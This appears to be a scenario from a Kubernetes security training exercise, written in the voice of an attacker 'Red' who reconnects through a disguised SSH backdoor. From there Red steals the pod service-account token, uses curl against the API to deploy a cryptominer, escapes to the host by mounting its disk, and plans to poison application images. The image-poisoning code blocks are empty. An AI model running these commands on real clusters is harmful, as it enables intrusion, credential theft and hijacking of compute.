# Persistence: Scenario 2 Attack

## Backstory

### Name: __Red__

* Opportunist
* Easy money via crypto-mining
* Uses automated scans of web IP space looking for known exploits and vulnerabilities

### Motivations

* __Red__ notices that public access to the cluster is gone and the cryptominers have stopped reporting in
* __Red__ is excited to discover that the SSH server they left behind is still active

## Re-establishing a Foothold

__Red__ reconnects to the cluster using the SSH service disguised as a *metrics-server* on the cluster. While having access to an individual container may not seem like much of a risk at first glance, this container has two characteristics that make it very dangerous:
  * There is a service account associated with the container which has been granted access to all kubernetes APIs
  * The container is running with a privileged security context which grants it direct access to the host OS

## Deploying Miners

Connect to the cluster via SSH:
```console
echo "SSH password is: Sup3r_S3cr3t_P@ssw0rd"
ssh root@<service IP from attack 1> -p 8080
```

To restart our crypto mining, we will need the token for the pod service account:
```console
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

We also want to make sure we are creating the new miners in the same namespace:
```console
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

And we will be connecting to the kubernetes API from inside the cluster this time:
```console
export API_SERVER="https://kubernetes.default.svc"
```

Lastly, we will need curl for this and our SSH image didn't come with it preinstalled:
```console
apk update && apk add curl
```

Now the fun part, let's create our miner:
```console
curl -k -X POST "$API_SERVER/apis/apps/v1/namespaces/$NAMESPACE/deployments" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data-binary '{"apiVersion":"apps/v1","kind":"Deployment","metadata":{"labels":{"run":"bitcoinero"},"name":"bitcoinero","namespace":"'$NAMESPACE'"},"spec":{"replicas":1,"revisionHistoryLimit":2,"selector":{"matchLabels":{"run":"bitcoinero"}},"strategy":{"rollingUpdate":{"maxSurge":"25%","maxUnavailable":"25%"},"type":"RollingUpdate"},"template":{"metadata":{"labels":{"run":"bitcoinero"}},"spec":{"containers":[{"image":"securekubernetes/bitcoinero:latest","name":"bitcoinero","command":["./moneymoneymoney"],"args":["-c","1","-l","10"],"resources":{"requests":{"cpu":"100m","memory":"128Mi"},"limits":{"cpu":"200m","memory":"128Mi"}}}]}}}}'
```

Verify that the pod is running:
```console
curl -k -X GET "$API_SERVER/api/v1/namespaces/$NAMESPACE/pods/bitcoinero" -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" 2>/dev/null | grep phase
```

## Future Proofing

__Red__ has already been discovered once on this system. Luckily we left a backdoor last time. We should probably do that again. This time, let's hide our miner inside of a legitimate application. Then we won't even need access to the cluster anymore, whenever the owner of the cluster runs their apps, our miners will get spun up right along with them.

To get started we need to escape the container and gain access to the host OS:
```console
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
chroot /mnt/hola /bin/bash
```
And just like that you are now root on the host node!

Next we need to figure out where the container images are coming from:
```console
kubectl get deployment <deployment-name> -n prod -o jsonpath="{.spec.template.spec.containers[*].image}"
```

Now let's add our crypto miner to the application image:
```console
```

And then we push our modified image to the repository, replacing the existing image. 
```console
```

Now, all future instances of the application that launch on this cluster will run our crypto miner alongside their application!

Time for some celebratory pizza!